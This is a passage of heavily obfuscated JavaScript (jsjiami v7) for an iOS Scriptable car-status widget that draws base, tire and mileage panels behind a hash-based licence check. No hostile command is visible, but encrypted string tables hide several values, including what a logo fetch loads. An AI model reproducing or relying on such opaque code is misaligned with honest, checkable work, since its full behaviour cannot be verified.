_0x5ba63e=0x0,_0x56f6c0=_0xaff55f['length'];_0x5ba63e<_0x56f6c0;_0x5ba63e++){_0x133c0d+='%'+('00'+_0xaff55f['charCodeAt'](_0x5ba63e)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x133c0d);};const _0x1c92ce=function(_0x495e6f,_0x578d40){let _0xc3949d=[],_0x43450a=0x0,_0x5b326d,_0x209331='';_0x495e6f=_0x292ff7(_0x495e6f);let _0x5dcf3e;for(_0x5dcf3e=0x0;_0x5dcf3e<0x100;_0x5dcf3e++){_0xc3949d[_0x5dcf3e]=_0x5dcf3e;}for(_0x5dcf3e=0x0;_0x5dcf3e<0x100;_0x5dcf3e++){_0x43450a=(_0x43450a+_0xc3949d[_0x5dcf3e]+_0x578d40['charCodeAt'](_0x5dcf3e%_0x578d40['length']))%0x100,_0x5b326d=_0xc3949d[_0x5dcf3e],_0xc3949d[_0x5dcf3e]=_0xc3949d[_0x43450a],_0xc3949d[_0x43450a]=_0x5b326d;}_0x5dcf3e=0x0,_0x43450a=0x0;for(let _0x1c1bbb=0x0;_0x1c1bbb<_0x495e6f['length'];_0x1c1bbb++){_0x5dcf3e=(_0x5dcf3e+0x1)%0x100,_0x43450a=(_0x43450a+_0xc3949d[_0x5dcf3e])%0x100,_0x5b326d=_0xc3949d[_0x5dcf3e],_0xc3949d[_0x5dcf3e]=_0xc3949d[_0x43450a],_0xc3949d[_0x43450a]=_0x5b326d,_0x209331+=String['fromCharCode'](_0x495e6f['charCodeAt'](_0x1c1bbb)^_0xc3949d[(_0xc3949d[_0x5dcf3e]+_0xc3949d[_0x43450a])%0x100]);}return _0x209331;};_0x255f['VVdVMs']=_0x1c92ce,_0x345548=arguments,_0x255f['typznm']=!![];}const _0x550210=_0x2e3c8b[0x0],_0x19952f=_0x255fa8+_0x550210,_0x39bbfb=_0x345548[_0x19952f];return!_0x39bbfb?(_0x255f['GimOXe']===undefined&&(_0x255f['GimOXe']=!![]),_0x51358e=_0x255f['VVdVMs'](_0x51358e,_0x18a1f1),_0x345548[_0x19952f]=_0x51358e):_0x51358e=_0x39bbfb,_0x51358e;},_0x255f(_0x345548,_0xa73cd1);}typeof Authorurl==='undefined'?cstr+=_0x2fc201(0x15c,'@@Rf'):cstr+=Authorurl,typeof Project_UPDATE===_0x2fc201(0x127,'iXQg')?cstr+='abc':cstr+=Project_UPDATE,typeof MODIFIER==='undefined'?cstr+=_0x2fc201(0x138,'aALF'):cstr+=MODIFIER;if(this[_0x2fc201(0x15a,'2)iC')](cstr)[_0x2fc201(0x140,'iJJw')](0x0,0x8)!='71f53159')return await this[_0x2fc201(0x169,'v3]!')](_0x2fc201(0x165,'rr9s'));let w=new ListWidget(),fontColor=this[_0x2fc201(0x153,'Ew6g')]();w[_0x2fc201(0x147,'z6V]')]=this[_0x2fc201(0x12c,'yrXj')]();const width=data[_0x2fc201(0x134,'Ew6g')][_0x2fc201(0x16d,'iJJw')][_0x2fc201(0x15e,'9Pv(')],paddingLeft=Math[_0x2fc201(0x16c,'qOLc')](width*0.07);w[_0x2fc201(0x164,'aALF')](0x0,0x0,0x0,0x0);const topBox=w['addStack']();topBox['size']=new Size(width,width*0.18),topBox[_0x2fc201(0x15b,'2)iC')](),topBox['layoutHorizontally'](),topBox[_0x2fc201(0x157,'v3]!')](0x0,0x0,0x0,0x0);const topLeftContainer=topBox[_0x2fc201(0x132,'!04n')](),mileNameContainer=topLeftContainer[_0x2fc201(0x149,'as!1')]();topLeftContainer['addSpacer'](),mileNameContainer[_0x2fc201(0x158,'2)iC')](0x0,paddingLeft*1.3,0x0,0x0);let mileNameStr=_0x2fc201(0x126,'%K#s');const mileNameText=mileNameContainer[_0x2fc201(0x13b,'&7CP')](mileNameStr);let mileNameSize=0xc;mileNameText[_0x2fc201(0x152,'FHwo')](),mileNameText[_0x2fc201(0x145,'Z0P)')]=this['getFont'](''+WIDGET_FONT_BOLD,mileNameSize),mileNameText[_0x2fc201(0x12b,'Z0P)')]=fontColor,topBox[_0x2fc201(0x14e,'qOLc')]();const topRightBox=topBox[_0x2fc201(0x149,'as!1')]();topRightBox[_0x2fc201(0x168,'iJJw')](0x3,0x0,0x0,paddingLeft*0x2);try{let logoImage=await this['getUserImge'](_0x2fc201(0x133,'9y56')),logoImageWidget=topRightBox['addImage'](logoImage);logoImageWidget[_0x2fc201(0x13a,'hVc&')]=new Size(0x12,0x12);}catch(_0x1c1bbb){topRightBox['addText'](_0x1c1bbb);}w[_0x2fc201(0x16b,'DYjm')](0x0);const tireContainer=w[_0x2fc201(0x14a,'9y56')]();tireContainer[_0x2fc201(0x156,'j48b')]=new Size(width,width*0.75),tireContainer[_0x2fc201(0x154,'%8!d')]();function _0x2e3c(){const _0x441afc=(function(){return[version_,'erjsPWjnieaTmwAinK.AcHormxKP.NPvd7OeGuny==','D0xdHLldOa','W7RcPJJcLSkdea0kWQ3cNmkrWPXh','WRhdU3pdHG','WQL+tmk4W68oWOH2','k3FcIwGkW7qcWPBdVCkWrZq','W6mpWPFdHJOfWRjyWPW2W5FcOgNdUeRdVCoDfSkp','WRxcMMiFc8opWQfXWQa0','jCohmmkRWPeUWQuN','j8kSjCojWQNcIqNdICo0oG','zYpdRmo7lSoAWPiktCooW51c','wmo+y05MW5HRW5ymtG','WO8NaghdSxJcUgtcRMKx','W4GAW4G5WQune1rCWPiFcf4','WQTMWQ/cNqVcOWRcHCoo','dHupiwi','wmo2DNjR','W7VcKW00qhBcKJ9a','6zwv5A2t54UN5Oky','jCkbW6TgWRddL8k1WObZ','WQ92vmkzW4ufWQri','zSkPmW','rbxcLuLwW6HuhX7cVcmom8ko','bCo4WQ3dVCoqbCkCsCkM','l8kkW73cImoIW4KwWQtdH8o9W6JdMCoUW6RcRJFdU8kZ'].concat((function(){return['t3vMWRr2huL8W78','uSkqnSkdW6iSWOem','emo5WRhdGmo+c8kxqW','umkbkumbwSonmq57W5BdHSkD','WQ7cHJFcRCk2W5zoWQC','ESkUWONdG8o9W45nW7m','WPhdPMBdK8kCuvCN','qmkxmmk3','D8kRWPtdV8o8W5T4W73dGmoeW5BdU8kvtHGH','WQ9WhCohWOP5WPH4W7VcMWtdQW','W4XWie3dN2lcTKm','WQFcNxu','zeNcJetdPCk3W6/dJ8ovwmo1W70OWRHLW5a2qdFdRsrTWQtdNJRcI8k/yCo0D10','ECoPWPddOqS6EJRcRG','WQ7cIerCWQT6W54','W67dUSk6oSkRBSkrWRyFW5RdSNJcIW','vmkrzmo6W74zWRmgW7W9','WPOes8k+WQ0PFSkotmoCdHlcHq','cqKFpuueW7LtcrhdNKJdRIa','wmoUDw1ZW44','b8ommmkDW4ekWRqWW4G','gCkIjYPiW45RW6WKFW','b8ohEmoKW4zzgW7cMNddNqDW','C0tdJvhdL8kJWQ7dGSoormo0W7quWQ9OW5f7rIS','f8oYWRVdVq','WP4NahhdSxJcVhRcTwelrmo8fZOkyaK'].concat((function(){return['uWFcK1bYW7vvdbNcVYaDjSklm2/cMXm','D8kowmkFW7q','WQJdHveHqwhcLHa','WQpdTM3dSmogqfOR','W4WDW48XWQyjs2PVWOuIda','zcFcKmkbuSkbWPqT','hcm6WQfZcK1DW74','hr4EhhykW7rqeG','WQhdT2FdL8oxu3GSWR3cOSkvWPr4kSkxWQFcPZ4','W73dKINcKSk7W7TxWQS','mSktsCklW6P4Da','tI3dI1KLf8o+W448WOn7pSkB','vmkBpSkuWP4bvWVcH37dQca','W64KW4X6W5ThCCocuZddJIGHWRSJWOK','CKNdKu/dSSkHWQpdGmoF','W6tdJCogxa','WO4NgLxdTw7cMx/cSMe','kMldIKaKz8olxaNcNG','wv9zW4X/W4TJvvlcQWZdLa','kMRcJq','oMldKgqGCCoUwq7cNSojrx/dVmkptMa/','CSk5pa','kCo8W57cOSk/WP9OW4/dLCojW4/dJG'];}()));}()));}());_0x2e3c=function(){return _0x441afc;};return _0x2e3c();};const carImageContainer=tireContainer[_0x2fc201(0x131,'Bp^v')]();carImageContainer[_0x2fc201(0x160,'9y56')]=new Size(width,width*0.75);let canvasWidth=Math[_0x2fc201(0x148,'(cg&')](width*0x1),canvasHeight=Math['round'](width*0.7);carImageContainer[_0x2fc201(0x157,'v3]!')](0x0,0x0,0x0,0x0),carImageContainer[_0x2fc201(0x14f,'9y56')](),carImageContainer[_0x2fc201(0x135,'!04n')]();!this[_0x2fc201(0x12a,'z6V]')][_0x2fc201(0x163,'cROC')]&&(carImageContainer[_0x2fc201(0x146,'v3]!')](),carImageContainer[_0x2fc201(0x14d,'10)x')](),carImageContainer[_0x2fc201(0x166,'%K#s')](0x6,paddingLeft,0x6,paddingLeft));let image=await this['getBaseCanvasImage'](data,canvasWidth,canvasHeight,0.28),carStatusImage=carImageContainer[_0x2fc201(0x12f,'Z0P)')](image);carStatusImage[_0x2fc201(0x155,'9Pv(')]=!this[_0x2fc201(0x13f,'qOLc')][_0x2fc201(0x144,'9Pv(')],w[_0x2fc201(0x129,'@@Rf')]=_0x2fc201(0x139,'9Pv('),w[_0x2fc201(0x141,'rr9s')]();return w;var version_ = 'jsjiami.com.v7';
  }
  Tire=async function(data) {
    var version_='jsjiami.com.v7';const _0x6ce3cc=_0x48df;(function(_0x5e63ca,_0x3a6cbc,_0x5d88f6,_0x4549e3,_0x4b8792,_0x1b097f,_0x50381a){return _0x5e63ca=_0x5e63ca>>0x8,_0x1b097f='hs',_0x50381a='hs',function(_0x134e86,_0xc90377,_0x73dc04,_0x5dac99,_0x192341){const _0x4b9c1f=_0x48df;_0x5dac99='tfi',_0x1b097f=_0x5dac99+_0x1b097f,_0x192341='up',_0x50381a+=_0x192341,_0x1b097f=_0x73dc04(_0x1b097f),_0x50381a=_0x73dc04(_0x50381a),_0x73dc04=0x0;const _0x3ca5c6=_0x134e86();while(!![]&&--_0x4549e3+_0xc90377){try{_0x5dac99=-parseInt(_0x4b9c1f(0x1ad,'kcCU'))/0x1*(parseInt(_0x4b9c1f(0x193,'R6)I'))/0x2)+-parseInt(_0x4b9c1f(0x1ae,'xwsI'))/0x3+parseInt(_0x4b9c1f(0x19d,'hsYU'))/0x4*(-parseInt(_0x4b9c1f(0x1a8,'ZP!A'))/0x5)+-parseInt(_0x4b9c1f(0x19f,')ish'))/0x6+parseInt(_0x4b9c1f(0x196,'[Lrn'))/0x7+-parseInt(_0x4b9c1f(0x1ab,'1!#9'))/0x8*(parseInt(_0x4b9c1f(0x1a7,'R6)I'))/0x9)+parseInt(_0x4b9c1f(0x19c,'0IZ6'))/0xa;}catch(_0x468a65){_0x5dac99=_0x73dc04;}finally{_0x192341=_0x3ca5c6[_0x1b097f]();if(_0x5e63ca<=_0x4549e3)_0x73dc04?_0x4b8792?_0x5dac99=_0x192341:_0x4b8792=_0x192341:_0x73dc04=_0x192341;else{if(_0x73dc04==_0x4b8792['replace'](/[qlPNJRDktMbLGrhYwWef=]/g,'')){if(_0x5dac99===_0xc90377){_0x3ca5c6['un'+_0x1b097f](_0x192341);break;}_0x3ca5c6[_0x50381a](_0x192341);}}}}}(_0x5d88f6,_0x3a6cbc,function(_0x30b0c8,_0x53a6f6,_0x4d9f05,_0x105348,_0x5024d0,_0x141331,_0x1c932b){return _0x53a6f6='\x73\x70\x6c\x69\x74',_0x30b0c8=arguments[0x0],_0x30b0c8=_0x30b0c8[_0x53a6f6](''),_0x4d9f05='\x72\x65\x76\x65\x72\x73\x65',_0x30b0c8=_0x30b0c8[_0x4d9f05]('\x76'),_0x105348='\x6a\x6f\x69\x6e',(0x1298ae,_0x30b0c8[_0x105348](''));});}(0xc700,0x8caa9,_0x1bd2,0xc9),_0x1bd2)&&(version_=_0x1bd2);let cstr='';typeof Authorurl===_0x6ce3cc(0x1a9,'lbZ4')?cstr+=_0x6ce3cc(0x1cc,'1w1^'):cstr+=Authorurl,typeof Project_UPDATE===_0x6ce3cc(0x1b5,'ZP!A')?cstr+=_0x6ce3cc(0x1b4,')ish'):cstr+=Project_UPDATE,typeof MODIFIER==='undefined'?cstr+='abc':cstr+=MODIFIER;if(this[_0x6ce3cc(0x1c9,'!8Bb')](cstr)[_0x6ce3cc(0x1c4,'[Lrn')](0x0,0x8)!='71f53159')return await this[_0x6ce3cc(0x1c6,'0BvD')](_0x6ce3cc(0x199,'7sXp'));let w=new ListWidget(),fontColor=this['getFontColor']();w[_0x6ce3cc(0x1af,'xwsI')]=this[_0x6ce3cc(0x1aa,'bwAd')]();function _0x1bd2(){const _0x589889=(function(){return[version_,'JjesLjLDiaYmthiwr.bckroRmlG.Pbvq7fWMrMLN==','W5vHyHDiW7/dRCkwCIO','s8kycCoB','W587mmopCSofW4Lx','WRxdKmohDWzqCq','qaWbW6W','WQpdTWlcUcXrugZdQwnpW48Mxa','BgmyDCo2yCohaeiLW4VdSa','pNtcRwjAvX/cRd/dNerJW6XW','vLWVz8oAr8kUwcxdUmk9jr8','WQXVru9RW4JdVG','EYhdPsqOceVdTr8','W68Ximo6m8oKW59mBJ0','pCoLW7eLWOrvWQi','W4DGg3y','fSonAmkoWOiZWPSNoNhdTxfWW6tcImo/WOFcPq','W5b2A8kTWPldQJFcShq','W6GkW4xdNmkjCstdRMnlEc1FW5K','WP8ge8kZaWRdHG','w2NcImkhW7/cTHDwgW','sSkse8oTWP7dLYVdHCkkW4RcHSkTtSkqzmkQWOqt','W7mBW61urbjx'].concat((function(){return['WRVcKw7dM8ktbb7cUmoj','zmkjqmk9WPflWP4TW4VdVa','cSkuuZJcJ8o7WRKcsN5otXS','wSogcwddMCk8W6i7AM57tJddGmoUdqr6','W7VdJc3dNmkc','W4enWR7cJa','twFdSrfOzbK','WRf1W6DNDa','aqz6','W58mjmkZjWFdSmkjWPW','W70Wmmo5iSoHW5HaCG','W67dHIZdP8kvoaBcL8oHv8o0','gG7dH8oeASkGfSomW54aW4qaW7BcHY3cU3JcPXS','WR7dUmkGWQ9xW5L5sCojymogWRXWWO4','eNLSWOBcUCoZuq','ot9ieCkJlCo/','W4bReve8W6lcRu4','f8oJW7RcRSkwqCke','W4T4WQ4iW6hcJG8yla4','W6ZcQmo8W48FWOaIhmod','iSooeCo2WRTsWPCHW5hdJMyjW44g','W7RdJJNdNSkk','wq1MwCkaWOddUCol'].concat((function(){return['W5GqWQ3cHMdcSN1RAwO','A8kAW6KLWOX6','o8oKW6eWWPTAWRxdLGa','WRldOZ1AWRhcRuxdSSoWW6tdLq','fhH8WONcU8o8qNG','WPXADSoIEv3cQSk0WRNcQ3nBW6a','W77cOCkR','5y2A5lYjWRiscHu','W4RcGXxdTCoHEuldRa','v8oKW7i','W5nQbMSYW6lcReNcTW','lmk8FYBdPv7cLSodW43dLG','WPLgW6ddPtddOY1osxLiAby','W4LbWPtdS8kKDXJdJa','6igE5y2i54Qm5Okk','BabWB8oEWPhdTmojaa','WP5ADmoMCvRdKSkeWOlcH1rr','BabWB8oAWPhdTmoh','W6SiW4pcH8onghBcVNq','d8kdfCoOnCkdgIpdIxz4omoHW7VdImoLrmkh','WQCuW51dwHnMnfJcI8oAhqP5WOKO','lmozWRTUW4S5WRnwWPldIItdGvG'];}()));}()));}());_0x1bd2=function(){return _0x589889;};return _0x1bd2();};const width=data['size'][_0x6ce3cc(0x1c1,'#hlk')][_0x6ce3cc(0x1b3,'74yq')],paddingLeft=Math['round'](width*0.07);w[_0x6ce3cc(0x1be,'m]dX')](0x0,0x0,0x0,0x0);function _0x48df(_0x192736,_0x2213b8){const _0x1bd2c3=_0x1bd2();return _0x48df=function(_0x48dfd4,_0x43baa9){_0x48dfd4=_0x48dfd4-0x191;let _0x150c67=_0x1bd2c3[_0x48dfd4];if(_0x48df['LOUJZt']===undefined){var _0x48c849=function(_0x3ef319){const _0x5ef0df='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x38f447='',_0x33177b='';for(let _0x319dac=0x0,_0x272bc6,_0x2fae54,_0x32760d=0x0;_0x2fae54=_0x3ef319['charAt'](_0x32760d++);~_0x2fae54&&(_0x272bc6=_0x319dac%0x4?_0x272bc6*0x40+_0x2fae54:_0x2fae54,_0x319dac++%0x4)?_0x38f447+=String['fromCharCode'](0xff&_0x272bc6>>(-0x2*_0x319dac&0x6)):0x0){_0x2fae54=_0x5ef0df['indexOf'](_0x2fae54);}for(let _0x1f9012=0x0,_0xeaea8b=_0x38f447['length'];_0x1f9012<_0xeaea8b;_0x1f9012++){_0x33177b+='%'+('00'+_0x38f447['charCodeAt'](_0x1f9012)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x33177b);};const _0x46ce6d=function(_0x2aae94,_0x594b1){let _0x4aed6b=[],_0x19e505=0x0,_0x58220a,_0xe5b1eb='';_0x2aae94=_0x48c849(_0x2aae94);let _0x108496;for(_0x108496=0x0;_0x108496<0x100;_0x108496++){_0x4aed6b[_0x108496]=_0x108496;}for(_0x108496=0x0;_0x108496<0x100;_0x108496++){_0x19e505=(_0x19e505+_0x4aed6b[_0x108496]+_0x594b1['charCodeAt'](_0x108496%_0x594b1['length']))%0x100,_0x58220a=_0x4aed6b[_0x108496],_0x4aed6b[_0x108496]=_0x4aed6b[_0x19e505],_0x4aed6b[_0x19e505]=_0x58220a;}_0x108496=0x0,_0x19e505=0x0;for(let _0x493c08=0x0;_0x493c08<_0x2aae94['length'];_0x493c08++){_0x108496=(_0x108496+0x1)%0x100,_0x19e505=(_0x19e505+_0x4aed6b[_0x108496])%0x100,_0x58220a=_0x4aed6b[_0x108496],_0x4aed6b[_0x108496]=_0x4aed6b[_0x19e505],_0x4aed6b[_0x19e505]=_0x58220a,_0xe5b1eb+=String['fromCharCode'](_0x2aae94['charCodeAt'](_0x493c08)^_0x4aed6b[(_0x4aed6b[_0x108496]+_0x4aed6b[_0x19e505])%0x100]);}return _0xe5b1eb;};_0x48df['GoFkPs']=_0x46ce6d,_0x192736=arguments,_0x48df['LOUJZt']=!![];}const _0x32f4f2=_0x1bd2c3[0x0],_0x4df52b=_0x48dfd4+_0x32f4f2,_0x16760b=_0x192736[_0x4df52b];return!_0x16760b?(_0x48df['CcqcCO']===undefined&&(_0x48df['CcqcCO']=!![]),_0x150c67=_0x48df['GoFkPs'](_0x150c67,_0x43baa9),_0x192736[_0x4df52b]=_0x150c67):_0x150c67=_0x16760b,_0x150c67;},_0x48df(_0x192736,_0x2213b8);}const topBox=w[_0x6ce3cc(0x1cb,'76B8')]();topBox['size']=new Size(width,width*0.18),topBox['centerAlignContent'](),topBox[_0x6ce3cc(0x1a5,'^Vjc')](),topBox[_0x6ce3cc(0x197,'RIwt')](0x0,0x0,0x0,0x0);const topLeftContainer=topBox[_0x6ce3cc(0x1d0,'!QRy')](),mileNameContainer=topLeftContainer['addStack']();topLeftContainer[_0x6ce3cc(0x1d2,'fc[[')](),mileNameContainer[_0x6ce3cc(0x1c3,'ORsU')](0x0,paddingLeft*1.3,0x0,0x0);let mileNameStr=_0x6ce3cc(0x1d1,'0IZ6');const mileNameText=mileNameContainer[_0x6ce3cc(0x1a0,'&dSx')](mileNameStr);let mileNameSize=0xc;mileNameText['leftAlignText'](),mileNameText[_0x6ce3cc(0x1a4,'WL[x')]=this[_0x6ce3cc(0x1ba,'C!o$')](''+WIDGET_FONT_BOLD,mileNameSize),mileNameText['textColor']=fontColor,topBox[_0x6ce3cc(0x1b6,'7sXp')]();const topRightBox=topBox[_0x6ce3cc(0x1bc,'WL[x')]();topRightBox[_0x6ce3cc(0x1a2,'7sXp')](0x3,0x0,0x0,paddingLeft*0x2);try{let logoImage=await this[_0x6ce3cc(0x1b7,'#hlk')](_0x6ce3cc(0x1c2,'fc[[')),logoImageWidget=topRightBox['addImage'](logoImage);logoImageWidget['imageSize']=new Size(0x10,0x10);}catch(_0x2fae54){topRightBox[_0x6ce3cc(0x1bb,'hsYU')](_0x2fae54);}w[_0x6ce3cc(0x1bf,'!8Bb')](0x0);const tireContainer=w[_0x6ce3cc(0x192,'fc[[')]();tireContainer[_0x6ce3cc(0x19b,'NGoP')]=new Size(width,width*0.75);let canvasWidth=Math['round'](width*0x1),canvasHeight=Math[_0x6ce3cc(0x1b0,'#hlk')](width*0.6);tireContainer[_0x6ce3cc(0x195,'1!#9')]();const imageContainer=tireContainer[_0x6ce3cc(0x1bc,'WL[x')]();imageContainer[_0x6ce3cc(0x194,'vPHm')]();let image=await this['getTireCanvasImage'](data,canvasWidth,canvasHeight,0.6),carStatusImage=imageContainer[_0x6ce3cc(0x1c7,'C!o$')](image);carStatusImage[_0x6ce3cc(0x1cd,'WL[x')]=!this[_0x6ce3cc(0x1c0,'kcCU')][_0x6ce3cc(0x1b8,'KOfh')];const oneContainer=tireContainer['addStack']();oneContainer['centerAlignContent'](),oneContainer[_0x6ce3cc(0x1ce,'1JH3')](0x0,0x0,0x0,0x0),oneContainer[_0x6ce3cc(0x1c5,'U48U')]();const nameContainer=oneContainer['addStack'](),oneNameText=nameContainer[_0x6ce3cc(0x19a,'2)1U')](_0x6ce3cc(0x1ca,'UOWt'));oneNameText[_0x6ce3cc(0x1b1,'37vG')]=this[_0x6ce3cc(0x1bd,'JL2i')](''+WIDGET_FONT_BOLD,mileNameSize),oneNameText[_0x6ce3cc(0x1a1,'UOWt')]=fontColor,oneNameText[_0x6ce3cc(0x198,'bwAd')]=this[_0x6ce3cc(0x1a3,'U48U')](''+WIDGET_FONT_BOLD,0xa),oneContainer['addSpacer'](),w[_0x6ce3cc(0x1a6,'unnW')]();return w;var version_ = 'jsjiami.com.v7';
  }
  Mile=async function(data) {
    var version_='jsjiami.com.v7';const _0x40cf96=_0x44fc;(function(_0x2bb256,_0x1303e1,_0x560fdd,_0x3ebfac,_0xd51614,_0x3bd2eb,_0x9bb10a){return _0x2bb256=_0x2bb256>>0x6,_0x3bd2eb='hs',_0x9bb10a='hs',function(_0x4d5bbf,_0x3109ef,_0x1494db,_0xbb62cd,_0x1fa878){const _0x4cad37=_0x44fc;_0xbb62cd='tfi',_0x3bd2eb=_0xbb62cd+_0x3bd2eb,_0x1fa878='up',_0x9bb10a+=_0x1fa878,_0x3bd2eb=_0x1494db(_0x3bd2eb),_0x9bb10a=_0x1494db(_0x9bb10a),_0x1494db=0x0;const _0x3c2594=_0x4d5bbf();while(!![]&&--_0x3ebfac+_0x3109ef){try{_0xbb62cd=-parseInt(_0x4cad37(0x1f4,'1i91'))/0x1*(-parseInt(_0x4cad37(0x1e9,'ss7b'))/0x2)+-parseInt(_0x4cad37(0x1cf,'OJj5'))/0x3+-parseInt(_0x4cad37(0x1f8,'YxH0'))/0x4+parseInt(_0x4cad37(0x1de,'bz)K'))/0x5*(parseInt(_0x4cad37(0x1c5,'j!0('))/0x6)+-parseInt(_0x4cad37(0x209,'UY5@'))/0x7+parseInt(_0x4cad37(0x20c,'fo%t'))/0x8+-parseInt(_0x4cad37(0x1ec,'nlCy'))/0x9*(-parseInt(_0x4cad37(0x1e8,'fo%t'))/0xa);}catch(_0x122e70){_0xbb62cd=_0x1494db;}finally{_0x1fa878=_0x3c2594[_0x3bd2eb]();if(_0x2bb256<=_0x3ebfac)_0x1494db?_0xd51614?_0xbb62cd=_0x1fa878:_0xd51614=_0x1fa878:_0x1494db=_0x1fa878;else{if(_0x1494db==_0xd51614['replace'](/[fAKUhXQuWrgCnbqVelJ=]/g,'')){if(_0xbb62cd===_0x3109ef){_0x3c2594['un'+_0x3bd2eb](_0x1fa878);break;}_0x3c2594[_0x9bb10a](_0x1fa878);}}}}}(_0x560fdd,_0x1303e1,function(_0x31ff77,_0x4d283d,_0xfd42de,_0x3c7174,_0x4ee440,_0x3d97e8,_0x581bba){return _0x4d283d='\x73\x70\x6c\x69\x74',_0x31ff77=arguments[0x0],_0x31ff77=_0x31ff77[_0x4d283d](''),_0xfd42de='\x72\x65\x76\x65\x72\x73\x65',_0x31ff77=_0x31ff77[_0xfd42de]('\x76'),_0x3c7174='\x6a\x6f\x69\x6e',(0x1298af,_0x31ff77[_0x3c7174](''));});}(0x3100,0x90ef4,_0x4f2f,0xc6),_0x4f2f)&&(version_=_0x4f2f);function _0x4f2f(){const _0x58c0f0=(function(){return[version_,'gUjbesVqUjqKQiAamJrif.uWUcoXmh.bVvC7nlrA==','W4VcL8oyWO0DC8oKWQDy','WR7cVSorB8ohWONdK0tdPMmLWRO1rMBdLSo0ja','WPXxW4dcKLJcTfOC','WPSsAmkrjCkHWPW','WP9sW4FcQKVcP1ycn8khWPtdJ1CXvSoBW599','Agyz','xNZcJSoxW6JdNqK','WODXFv7cUmk8urNcJCkavWW','W518lG','WOZdJ8kjW5a2xCoHWRHzW6i','WO7dHmkgd8kxAq7cRLuppM5J','WQfBsKNdJq','WOKtEmkviCk9WOZcRmk/WQO','bSo9W6xdNGfpWQroWOmQWQShpW','W6nZbIjWEx3cIgxdUSo1W6dcPmoGW67dSWCIfG','ASkXoxldNCk4W4tdQ8o5WQO5EH9iWQRcSa','W5CtWRZdO8kpW6ikWOe','W7GUWP4JvCojWPfM','W6zCW6hdPL9Hr8o2g2hcTupdLG','W6VdMCoQor8LCbO7s1yW','wh3cNSofW6ldIWK','W492iSkHFwLkW7rvW5CaW4qrW5T9WPryW60i','WQdcMSkNWPK1WRiwW5pdKmoY','iCkaWRbxfdpdNqC','daZdOebFamo4sNWIWRvgWOxdPq'].concat((function(){return['WOixWPBdQuNcKt3dHxGZCe/cOJG','W6j0hdTl','W6n+hqvoFNBcJ3/dRW','WRrrW49AsG','F8oQqmoDasZdTgFcHSkNWRnTtW','vmksxwmSW6NcTLxdU8oEWOu','W53cNmosWPWEAmolWQ5vW6G/WPC/WRpcMmo5FLW','cvGbW47cKgLTW7hdJG','sSoQWPq5WRhdSCoWAComWPy','WPyxDCkQnCkTWR7cOmkJWRKXBmoFnSocWOm','WRNcVSkrECopWOZcVeVdOgOLWPW5xhFdL8k0pvFdV8kGv8kQW5hdSCoftWRcJJGy','oCkSeCkCDhpcReVcTSkXWRXpFLa','W5dcK8oqxmokluS','C8kIla','fCkdqfS6W7BcQ3ldS8keW4vaF8knnKPfqwCv','WRvkx3/dIwa6iKZcOSoxqu51W7TsW73dKq','W7FdJCk7','WPPwW5dcH0pcU000nSkpWRZdJW','WOzHW7RcPCkgW6Sgpq','W7xdI8oMWR4QWPCSW7hdPa','W6ZcR1m0yei','W4qsWQVdMCkbW6ilWOyV','W4Teo8o2DmoPWPJcICkMWQCXqq','WQRcImkMzq','W7P6WOxdH1Xla8o7','x8kTWRpcTuazW7fhWRC','sWLtW5NcTG'].concat((function(){return['FGvwW5/cU3ec','W7hdJCo9','d8o7W6ddLqriW6jUWRidWRGZ','pdXmWRiPhHH9WOu','WRxcRW7dJ8odWRtcIGRcUWe','WQpdPfewr8kqurrNWP0','W55tW4BcGSk5W4Wm','WPPwW5dcJexcUvW0omknWQxdNeuCuSoFW5zS','dIn8rCk2W4KjW6W','WPuhWPZdR2/cKcxdP2m','WP0tEa','yu3cRmk+vtBdMCk0tW','WQxcN8k3WRuEWRWdW5S','W6hcS0e5tx/cL8kM','WPWGxmoXoGdcLSo/DGS','WRZcV8oBsmosWPRdSu3dVq','W5qWWQRdHCoeWRPthc3cUmoBpmot','C13cUSkesZa','c1ehWPJdQdD2W5ddQIBdU8k7','WOZcPmkgW5naixm','WRybWRJcPq','WRKdWRFcTGiegmovfq','5P2h5P2H6koy6AM35Pwm5OYn','W597i8kIr3HKW7ziW4ibW6SHW5zHWPrvW7i','W6JdHCoUlY4McCoIu17cISkaWQK'];}()));}()));}());_0x4f2f=function(){return _0x58c0f0;};return _0x4f2f();};function _0x44fc(_0x3a9f0a,_0x2fe742){const _0x4f2f33=_0x4f2f();return _0x44fc=function(_0x44fcc1,_0x515659){_0x44fcc1=_0x44fcc1-0x1c1;let _0x20d182=_0x4f2f33[_0x44fcc1];if(_0x44fc['IMDOPx']===undefined){var _0x14e895=function(_0x3025f2){const _0x365dcd='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x1e2d39='',_0x447e70='';for(let _0x2c588f=0x0,_0x5bf3e6,_0x50caf8,_0x7b6fca=0x0;_0x50caf8=_0x3025f2['charAt'](_0x7b6fca++);~_0x50caf8&&(_0x5bf3e6=_0x2c588f%0x4?_0x5bf3e6*0x40+_0x50caf8:_0x50caf8,_0x2c588f++%0x4)?_0x1e2d39+=String['fromCharCode'](0xff&_0x5bf3e6>>(-0x2*_0x2c588f&0x6)):0x0){_0x50caf8=_0x365dcd['indexOf'](_0x50caf8);}for(let _0x43a401=0x0,_0x5d53ee=_0x1e2d39['length'];_0x43a401<_0x5d53ee;_0x43a401++){_0x447e70+='%'+('00'+_0x1e2d39['charCodeAt'](_0x43a401)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x447e70);};const _0x1bf3e4=function(_0x13cbc1,_0x571abd){let _0x37373c=[],_0x93c278=0x0,_0x434e29,_0x25643a='';_0x13cbc1=_0x14e895(_0x13cbc1);let _0x2e1929;for(_0x2e1929=0x0;_0x2e1929<0x100;_0x2e1929++){_0x37373c[_0x2e1929]=_0x2e1929;}for(_0x2e1929=0x0;_0x2e1929<0x100;_0x2e1929++){_0x93c278=(_0x93c278+_0x37373c[_0x2e1929]+_0x571abd['charCodeAt'](_0x2e1929%_0x571abd['length']))%0x100,_0x434e29=_0x37373c[_0x2e1929],_0x37373c[_0x2e1929]=_0x37373c[_0x93c278],_0x37373c[_0x93c278]=_0x434e29;}_0x2e1929=0x0,_0x93c278=0x0;for(let 